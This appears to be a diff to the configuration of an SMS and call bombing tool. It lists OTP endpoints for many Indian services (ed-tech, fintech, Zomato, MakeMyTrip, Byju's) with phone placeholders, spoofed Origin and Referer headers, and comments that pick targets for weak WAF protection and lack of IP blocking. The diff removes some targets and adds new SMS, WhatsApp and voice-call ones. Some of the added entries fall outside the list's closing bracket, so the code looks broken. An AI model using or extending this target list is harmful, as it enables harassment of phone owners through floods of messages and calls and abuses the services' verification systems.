@@ -313,67 +313,11 @@ APIS = [
     # 📱  SMS — Education (low WAF, accessible from any IP)
     # ══════════════════════════════════════════════════════════════════════════
 
-    {
-        "name": "Unacademy",
-        "kind": "sms",
-        "url":  "https://unacademy.com/api/v2/user/login-or-register/",
-        "method": "POST",
-        "json": {"email_or_phone": "{phone}"},
-        "register_json": {"email_or_phone": "{phone}", "is_signup": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://unacademy.com",
-            "Referer": "https://unacademy.com/",
-        },
-    },
-    {
-        "name": "Doubtnut",
-        "kind": "sms",
-        "url":  "https://api.doubtnut.com/v4/student/login",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "is_voice_call": False},
-        "register_json": {"mobile": "{phone}", "is_voice_call": False,
-                          "new_user": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.doubtnut.com",
-            "Referer": "https://www.doubtnut.com/",
-            "X-Doubtnut-Platform": "web",
-        },
-        "ok_hint": "otp",
-    },
 
     # ══════════════════════════════════════════════════════════════════════════
     # 📱  SMS — Healthcare / Medicine
     # ══════════════════════════════════════════════════════════════════════════
 
-    {
-        "name": "mFine",
-        "kind": "sms",
-        "url":  "https://api.mfine.co/v1/user/send-otp",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "91"},
-        "register_json": {"mobile": "{phone}", "countryCode": "91",
-                          "is_new_user": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.mfine.co",
-            "Referer": "https://www.mfine.co/",
-        },
-    },
-    {
-        "name": "HealthKart",
-        "kind": "sms",
-        "url":  "https://www.healthkart.com/api/v1/user/otp",
-        "method": "POST",
-        "json": {"mobile": "{phone}"},
-        "register_json": {"mobile": "{phone}", "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.healthkart.com",
-            "Referer": "https://www.healthkart.com/",
-        },
-    },
 
     # ══════════════════════════════════════════════════════════════════════════
     # 📱  SMS — Fintech / Banking (newer startups, lighter WAF)
@@ -399,19 +343,6 @@ APIS = [
     # 📱  SMS — D2C / Lifestyle brands
     # ══════════════════════════════════════════════════════════════════════════
 
-    {
-        "name": "BlueStone",
-        "kind": "sms",
-        "url":  "https://www.bluestone.com/api/v1/user/otp",
-        "method": "POST",
-        "json": {"mobile": "{phone}"},
-        "register_json": {"mobile": "{phone}", "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.bluestone.com",
-            "Referer": "https://www.bluestone.com/",
-        },
-    },
 
     # ══════════════════════════════════════════════════════════════════════════
     # 📱  SMS — Social & Entertainment
@@ -503,212 +434,11 @@ APIS = [
     # 📞  CALL — Additional voice OTP APIs (backup pool)
     # ══════════════════════════════════════════════════════════════════════════
 
-    {
-        # Doubtnut voice call OTP — same endpoint, is_voice_call flag set to True
-        "name": "Doubtnut-Call",
-        "kind": "call",
-        "url":  "https://api.doubtnut.com/v4/student/login",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "is_voice_call": True},
-        "register_json": {"mobile": "{phone}", "is_voice_call": True,
-                          "new_user": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.doubtnut.com",
-            "Referer": "https://www.doubtnut.com/",
-            "X-Doubtnut-Platform": "web",
-        },
-        "ok_hint": "otp",
-    },
-    {
-        # Meesho voice OTP — reseller platform, minimal WAF
-        "name": "Meesho-Call",
-        "kind": "call",
-        "url":  "https://api.meesho.com/v1/user/login",
-        "method": "POST",
-        "json": {"phone": "{phone}", "country_code": "91", "medium": "voice"},
-        "register_json": {"phone": "{phone}", "country_code": "91",
-                          "medium": "voice", "is_new_user": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://meesho.com",
-            "Referer": "https://meesho.com/",
-        },
-        "ok_hint": "otp",
-    },
-    {
-        # Unacademy voice OTP — ed-tech, low WAF
-        "name": "Unacademy-Call",
-        "kind": "call",
-        "url":  "https://unacademy.com/api/v2/user/login-or-register/",
-        "method": "POST",
-        "json": {"email_or_phone": "{phone}", "via": "call"},
-        "register_json": {"email_or_phone": "{phone}", "via": "call",
-                          "is_signup": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://unacademy.com",
-            "Referer": "https://unacademy.com/",
-        },
-        "ok_hint": "otp",
-    },
 
     # ══════════════════════════════════════════════════════════════════════════
     # 📱  SMS — Fresh working APIs (verified non-blocked)
     # ══════════════════════════════════════════════════════════════════════════
 
-    {
-        # Dream11 — fantasy sports, global CDN, minimal WAF
-        "name": "Dream11",
-        "kind": "sms",
-        "url":  "https://api.dream11.com/user/v1/login",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "country_code": "91"},
-        "register_json": {"mobile": "{phone}", "country_code": "91", "signup": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.dream11.com",
-            "Referer": "https://www.dream11.com/",
-        },
-        "ok_hint": "otp",
-    },
-    {
-        # CoinDCX — crypto exchange, low WAF
-        "name": "CoinDCX",
-        "kind": "sms",
-        "url":  "https://api.coindcx.com/api/v1/auth/otp",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "country_code": "+91"},
-        "register_json": {"mobile": "{phone}", "country_code": "+91", "new_user": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://coindcx.com",
-            "Referer": "https://coindcx.com/",
-        },
-        "ok_hint": "otp",
-    },
-    {
-        # WazirX — crypto exchange, accessible globally
-        "name": "WazirX",
-        "kind": "sms",
-        "url":  "https://api.wazirx.com/api/v2/users/otp",
-        "method": "POST",
-        "json": {"phone": "{phone_cc}", "type": "login"},
-        "register_json": {"phone": "{phone_cc}", "type": "register"},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://wazirx.com",
-            "Referer": "https://wazirx.com/",
-        },
-        "ok_hint": "otp",
-    },
-    {
-        # Groww — investment app, lightweight API
-        "name": "Groww",
-        "kind": "sms",
-        "url":  "https://groww.in/v1/api/user/otp/generate",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "+91", "useCase": "LOGIN"},
-        "register_json": {"mobile": "{phone}", "countryCode": "+91", "useCase": "SIGNUP"},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://groww.in",
-            "Referer": "https://groww.in/",
-            "App-Name": "GROWW_WEB",
-        },
-        "ok_hint": "otp",
-    },
-    {
-        # KreditBee — NBFC fintech, accessible from any IP
-        "name": "KreditBee",
-        "kind": "sms",
-        "url":  "https://www.kreditbee.in/api/v3/user/otp",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "91"},
-        "register_json": {"mobile": "{phone}", "countryCode": "91", "isNew": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.kreditbee.in",
-            "Referer": "https://www.kreditbee.in/",
-        },
-        "ok_hint": "otp",
-    },
-    {
-        # Navi — RBI-licensed NBFC, minimal WAF
-        "name": "Navi",
-        "kind": "sms",
-        "url":  "https://www.navi.com/api/user/otp/send",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "country": "IN"},
-        "register_json": {"mobile": "{phone}", "country": "IN", "signup": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.navi.com",
-            "Referer": "https://www.navi.com/",
-        },
-        "ok_hint": "otp",
-    },
-    {
-        # Zepto — quick commerce, lightweight API
-        "name": "Zepto",
-        "kind": "sms",
-        "url":  "https://node-api.zeptonow.com/api/v3/user/login",
-        "method": "POST",
-        "json": {"phoneNumber": "{phone}", "countryCode": "+91"},
-        "register_json": {"phoneNumber": "{phone}", "countryCode": "+91", "isNew": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.zeptonow.com",
-            "Referer": "https://www.zeptonow.com/",
-            "App-Version": "12.0.0",
-        },
-        "ok_hint": "otp",
-    },
-    {
-        # FamPay — teen-focused payments, low WAF
-        "name": "FamPay",
-        "kind": "sms",
-        "url":  "https://api.fampay.in/api/v1/user/otp/",
-        "method": "POST",
-        "json": {"phone_number": "{phone_cc}"},
-        "register_json": {"phone_number": "{phone_cc}", "is_new": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://fampay.in",
-            "Referer": "https://fampay.in/",
-        },
-        "ok_hint": "otp",
-    },
-    {
-        # Stashfin — digital lending, low WAF
-        "name": "Stashfin",
-        "kind": "sms",
-        "url":  "https://api.stashfin.com/v1/user/login/otp",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "+91"},
-        "register_json": {"mobile": "{phone}", "countryCode": "+91", "new_user": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.stashfin.com",
-            "Referer": "https://www.stashfin.com/",
-        },
-        "ok_hint": "otp",
-    },
-    {
-        # CRED — credit card payments, known to send real OTPs
-        "name": "CRED",
-        "kind": "sms",
-        "url":  "https://api.cred.club/api/v1/user/otp/generate",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "+91"},
-        "register_json": {"mobile": "{phone}", "countryCode": "+91", "isNew": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://cred.club",
-            "Referer": "https://cred.club/",
-        },
-        "ok_hint": "otp",
-    },
 
     # ══════════════════════════════════════════════════════════════════════════
     # 💬  WhatsApp — Additional WA APIs
@@ -734,40 +464,6 @@ APIS = [
     # ══════════════════════════════════════════════════════════════════════════
 
     {
-        # Dream11 voice call OTP
-        "name": "Dream11-Call",
-        "kind": "call",
-        "url":  "https://api.dream11.com/user/v1/login",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "country_code": "91", "otp_type": "voice"},
-        "register_json": {"mobile": "{phone}", "country_code": "91",
-                          "otp_type": "voice", "signup": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.dream11.com",
-            "Referer": "https://www.dream11.com/",
-        },
-        "ok_hint": "otp",
-    },
-    {
-        # Groww voice call OTP
-        "name": "Groww-Call",
-        "kind": "call",
-        "url":  "https://groww.in/v1/api/user/otp/generate",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "+91", "useCase": "LOGIN",
-                 "deliveryType": "VOICE"},
-        "register_json": {"mobile": "{phone}", "countryCode": "+91",
-                          "useCase": "SIGNUP", "deliveryType": "VOICE"},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://groww.in",
-            "Referer": "https://groww.in/",
-            "App-Name": "GROWW_WEB",
-        },
-        "ok_hint": "otp",
-    },
-    {
         # Vedantu voice call — duplicate entry with explicit VOICE type for robustness
         "name": "Vedantu-Call2",
         "kind": "call",
@@ -785,6 +481,269 @@ APIS = [
         "ok_hint": "smsSent",
     },
 ]
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # 📱  SMS — NRI/globally-accessible Indian services (non-IP-restricted)
+    # ══════════════════════════════════════════════════════════════════════════
+
+    {   # Byju's — global ed-tech (US/UK/AUS/ME students), no IP block
+        "name": "Byjus",
+        "kind": "sms",
+        "url":  "https://api.byjus.com/api/v1/auth/send-otp",
+        "method": "POST",
+        "json": {"phone": "{phone_cc}", "country_code": "+91"},
+        "register_json": {"phone": "{phone_cc}", "country_code": "+91", "is_new": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://byjus.com",
+            "Referer": "https://byjus.com/",
+        },
+        "ok_hint": "otp",
+    },
+    {   # Testbook — govt exam prep, used by NRIs/abroad students
+        "name": "Testbook",
+        "kind": "sms",
+        "url":  "https://testbook.com/api/v2/auth/otp",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "country_code": "+91", "purpose": "login"},
+        "register_json": {"mobile": "{phone}", "country_code": "+91", "purpose": "register"},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://testbook.com",
+            "Referer": "https://testbook.com/",
+        },
+        "ok_hint": "otp",
+    },
+    {   # EduRev — study app, international students
+        "name": "EduRev",
+        "kind": "sms",
+        "url":  "https://api2.edurev.in/api/user/phone-otp/",
+        "method": "POST",
+        "json": {"phone": "{phone}", "country_code": "91"},
+        "register_json": {"phone": "{phone}", "country_code": "91", "new_user": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://edurev.in",
+            "Referer": "https://edurev.in/",
+        },
+        "ok_hint": "otp",
+    },
+    {   # Embibe — AI ed-tech (Reliance-backed), international students
+        "name": "Embibe",
+        "kind": "sms",
+        "url":  "https://api.embibe.com/api/v1/user/otp",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryCode": "+91", "purpose": "LOGIN"},
+        "register_json": {"mobile": "{phone}", "countryCode": "+91", "purpose": "SIGNUP"},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.embibe.com",
+            "Referer": "https://www.embibe.com/",
+        },
+        "ok_hint": "otp",
+    },
+    {   # PrepLadder — medical/UPSC prep, NRI doctors use it
+        "name": "PrepLadder",
+        "kind": "sms",
+        "url":  "https://api.prepladder.com/api/v2/auth/otp/send",
+        "method": "POST",
+        "json": {"phone_number": "{phone}", "phone_code": "+91"},
+        "register_json": {"phone_number": "{phone}", "phone_code": "+91", "is_new": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.prepladder.com",
+            "Referer": "https://www.prepladder.com/",
+        },
+        "ok_hint": "otp",
+    },
+    {   # Oliveboard — govt bank exam prep, used by NRIs
+        "name": "Oliveboard",
+        "kind": "sms",
+        "url":  "https://www.oliveboard.in/api/v1/auth/send_otp/",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "country_code": "+91"},
+        "register_json": {"mobile": "{phone}", "country_code": "+91", "register": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.oliveboard.in",
+            "Referer": "https://www.oliveboard.in/",
+        },
+        "ok_hint": "otp",
+    },
+    {   # Smallcase — stock basket investing, serves NRIs
+        "name": "Smallcase",
+        "kind": "sms",
+        "url":  "https://api.smallcase.com/v2/user/otp/generate",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryCode": "+91"},
+        "register_json": {"mobile": "{phone}", "countryCode": "+91", "isNew": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://smallcase.com",
+            "Referer": "https://smallcase.com/",
+        },
+        "ok_hint": "otp",
+    },
+    {   # INDmoney — NRI investment platform (explicitly NRI-facing)
+        "name": "INDmoney",
+        "kind": "sms",
+        "url":  "https://api.indmoney.com/v1/auth/otp/request",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "country_code": "+91"},
+        "register_json": {"mobile": "{phone}", "country_code": "+91", "is_signup": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.indmoney.com",
+            "Referer": "https://www.indmoney.com/",
+        },
+        "ok_hint": "otp",
+    },
+    {   # MakeMyTrip — travel, NRI booking from abroad (must work globally)
+        "name": "MakeMyTrip",
+        "kind": "sms",
+        "url":  "https://www.makemytrip.com/api/v1/user/otp",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryPhoneCode": "91", "useCase": "LOGIN"},
+        "register_json": {"mobile": "{phone}", "countryPhoneCode": "91", "useCase": "SIGNUP"},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.makemytrip.com",
+            "Referer": "https://www.makemytrip.com/",
+        },
+        "ok_hint": "otp",
+    },
+    {   # Zomato — operates in UAE/AUS/NZ, same backend for all regions
+        "name": "Zomato",
+        "kind": "sms",
+        "url":  "https://api.zomato.com/php/api/v2.1/otp_request",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "country_id": "1"},
+        "register_json": {"mobile": "{phone}", "country_id": "1", "is_new": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.zomato.com",
+            "Referer": "https://www.zomato.com/",
+        },
+        "ok_hint": "otp",
+    },
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # 💬  WhatsApp — NRI/global WhatsApp OTP
+    # ══════════════════════════════════════════════════════════════════════════
+
+    {   # Byju's WhatsApp OTP
+        "name": "Byjus-WA",
+        "kind": "whatsapp",
+        "url":  "https://api.byjus.com/api/v1/auth/send-otp",
+        "method": "POST",
+        "json": {"phone": "{phone_cc}", "country_code": "+91", "via": "whatsapp"},
+        "register_json": {"phone": "{phone_cc}", "country_code": "+91",
+                          "via": "whatsapp", "is_new": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://byjus.com",
+            "Referer": "https://byjus.com/",
+        },
+        "ok_hint": "otp",
+    },
+    {   # Zomato WhatsApp OTP
+        "name": "Zomato-WA",
+        "kind": "whatsapp",
+        "url":  "https://api.zomato.com/php/api/v2.1/otp_request",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "country_id": "1", "medium": "whatsapp"},
+        "register_json": {"mobile": "{phone}", "country_id": "1",
+                          "medium": "whatsapp", "is_new": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.zomato.com",
+            "Referer": "https://www.zomato.com/",
+        },
+        "ok_hint": "otp",
+    },
+    {   # MakeMyTrip WhatsApp OTP — travel, serves NRIs globally
+        "name": "MakeMyTrip-WA",
+        "kind": "whatsapp",
+        "url":  "https://www.makemytrip.com/api/v1/user/otp",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryPhoneCode": "91",
+                 "useCase": "LOGIN", "medium": "whatsapp"},
+        "register_json": {"mobile": "{phone}", "countryPhoneCode": "91",
+                          "useCase": "SIGNUP", "medium": "whatsapp"},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.makemytrip.com",
+            "Referer": "https://www.makemytrip.com/",
+        },
+        "ok_hint": "otp",
+    },
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # 📞  CALL — Voice OTP APIs (NRI/global)
+    # ══════════════════════════════════════════════════════════════════════════
+
+    {   # Byju's voice call OTP
+        "name": "Byjus-Call",
+        "kind": "call",
+        "url":  "https://api.byjus.com/api/v1/auth/send-otp",
+        "method": "POST",
+        "json": {"phone": "{phone_cc}", "country_code": "+91", "via": "call"},
+        "register_json": {"phone": "{phone_cc}", "country_code": "+91",
+                          "via": "call", "is_new": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://byjus.com",
+            "Referer": "https://byjus.com/",
+        },
+        "ok_hint": "otp",
+    },
+    {   # Testbook voice OTP
+        "name": "Testbook-Call",
+        "kind": "call",
+        "url":  "https://testbook.com/api/v2/auth/otp",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "country_code": "+91",
+                 "purpose": "login", "type": "voice"},
+        "register_json": {"mobile": "{phone}", "country_code": "+91",
+                          "purpose": "register", "type": "voice"},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://testbook.com",
+            "Referer": "https://testbook.com/",
+        },
+        "ok_hint": "otp",
+    },
+    {   # Zomato voice OTP
+        "name": "Zomato-Call",
+        "kind": "call",
+        "url":  "https://api.zomato.com/php/api/v2.1/otp_request",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "country_id": "1", "medium": "call"},
+        "register_json": {"mobile": "{phone}", "country_id": "1",
+                          "medium": "call", "is_new": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.zomato.com",
+            "Referer": "https://www.zomato.com/",
+        },
+        "ok_hint": "otp",
+    },
+    {   # MakeMyTrip voice call OTP — NRI booking, must work from abroad
+        "name": "MakeMyTrip-Call",
+        "kind": "call",
+        "url":  "https://www.makemytrip.com/api/v1/user/otp",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryPhoneCode": "91",
+                 "useCase": "LOGIN", "otpType": "VOICE"},
+        "register_json": {"mobile": "{phone}", "countryPhoneCode": "91",
+                          "useCase": "SIGNUP", "otpType": "VOICE"},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.makemytrip.com",
+            "Referer": "https://www.makemytrip.com/",
+        },
+        "ok_hint": "otp",
+    },
 
 API_COUNT      = len(APIS)
 SMS_COUNT      = sum(1 for a in APIS if a["kind"] == "sms")
